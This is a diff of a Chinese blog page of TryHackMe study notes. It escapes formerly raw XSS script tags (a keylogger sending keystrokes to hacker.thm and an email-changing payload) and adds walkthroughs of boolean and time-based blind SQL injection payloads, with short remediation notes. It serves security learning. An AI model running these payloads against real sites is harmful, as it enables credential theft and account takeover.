@@ -94,7 +94,7 @@
 <meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403081045437.png">
 <meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202403082316313.png">
 <meta property="article:published_time" content="2024-03-08T15:55:20.810Z">
-<meta property="article:modified_time" content="2024-03-08T16:01:20.643Z">
+<meta property="article:modified_time" content="2024-03-09T15:47:54.570Z">
 <meta property="article:author" content="FSRM">
 <meta property="article:tag" content="tryhackme">
 <meta name="twitter:card" content="summary_large_image">
@@ -332,7 +332,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          11k 字
+          13k 字
         
       </span>
     
@@ -343,7 +343,7 @@
         
         
         
-          95 分钟
+          106 分钟
         
       </span>
     
@@ -786,11 +786,11 @@
 
 <p><strong>键盘记录器：</strong></p>
 <p>下面的代码充当键盘记录器。这意味着您在网页上输入的任何内容都将被转发到黑客控制下的网站。如果有效负载安装在接受的用户登录名或信用卡详细信息上的网站，这可能会非常具有破坏性。</p>
-<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">onkeypress</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) &#123; <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://hacker.thm/log?key=&#x27;</span> + <span class="hljs-title function_">btoa</span>(e.<span class="hljs-property">key</span>) );&#125;&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 
 <p><strong>业务逻辑：</strong></p>
 <p>此有效负载比上述示例具体得多。这将是关于调用特定的网络资源或 JavaScript 函数。例如，假设一个用于更改用户电子邮件地址的 JavaScript 函数，称为 .有效负载可能如下所示：<code>user.changeEmail()</code></p>
-<script>user.changeEmail('attacker@hacker.thm');</script>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;user.<span class="hljs-title function_">changeEmail</span>(<span class="hljs-string">&#x27;attacker@hacker.thm&#x27;</span>);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
 
 
 
@@ -903,7 +903,17 @@
 <p>实践:</p>
 <p>level1: 很常规的sql注入  (-2 union select 1,2,group_concat(id,username,password) from staff_users)</p>
 <p>level2:万能密码登录</p>
-<p>level3:</p>
+<p>level3:  就是利用了like语句和盲注的特性，在本界面中存在的就返回true，否则就返回false  (布尔盲注)</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span>首先我们先查询数据库  admin123<span class="hljs-string">&#x27; union select 1,2,3 where database() like &#x27;</span>a%<span class="hljs-string">&#x27;;--  通过爆破我们可以得到数据库的名字=&gt;sqli_three</span><br><span class="hljs-string"></span><br><span class="hljs-string">2.然后我们再去爆破表名 admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli_three&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">--  得到表的名字=&gt;users</span><br><br><span class="hljs-number">3.</span>接着是爆列名 admin123<span class="hljs-string">&#x27; union select 1,2,3 from information_schema.columns where table_schema=&#x27;</span>sqli_thre<span class="hljs-string">e&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27; and column_name like &#x27;</span>a%<span class="hljs-string">&#x27;;--  </span><br><span class="hljs-string">4. 列名有的不仅仅一个 然后我们得到一个之后就需要把这个给排除掉 </span><br><span class="hljs-string">admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;sqli_three&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">column_name</span>!=<span class="hljs-string">&#x27;id&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">-- </span><br><br><span class="hljs-number">5.</span>得到列名之后就是内容了 然后一样的思路 列名得到的是 (id,username,<span class="hljs-keyword">password</span>)<br>admin123<span class="hljs-string">&#x27; union select 1,2,3 from users where username like &#x27;</span>a%<span class="hljs-string">&#x27;;--</span><br><span class="hljs-string">admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">--</span><br>最终得到 <span class="hljs-keyword">admin</span> <span class="hljs-number">3845</span><br></code></pre></td></tr></table></figure>
+
+<p>level4: (时间盲注)</p>
+<p>跟布尔盲注的区别是，它并不会返回语句是否执行成功 然后有一个语句是延迟的 sleep() 我们可以通过这个来进行判断相关信息</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span><span class="hljs-keyword">admin</span><span class="hljs-string">&#x27; union select 1,sleep(5);-- //判断有两列 因为这样它会延迟5秒后返回界面</span><br><span class="hljs-string"></span><br><span class="hljs-string">2.剩下的步骤跟布尔盲注没什么区别 就是有了sleep来判断查询的数据是否存在</span><br><span class="hljs-string"></span><br><span class="hljs-string">3.admin123&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>) <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;a%&#x27;</span>;<span class="hljs-comment">--</span><br><br>然后这一关用户名是<span class="hljs-keyword">admin</span> 密码的话仍然是<span class="hljs-number">4</span>位数字 需要自己去爆破<br></code></pre></td></tr></table></figure>
+
+<p>到具体情况还得写脚本进行爆破，或者是利用burp进行爆破  </p>
+<p>修复:</p>
+<p>1.白名单，对于一些不允许输入的字符串进行一个替换</p>
+<p>2.对用户输入的特殊字符进行转义处理</p>
 
                 
               </div>
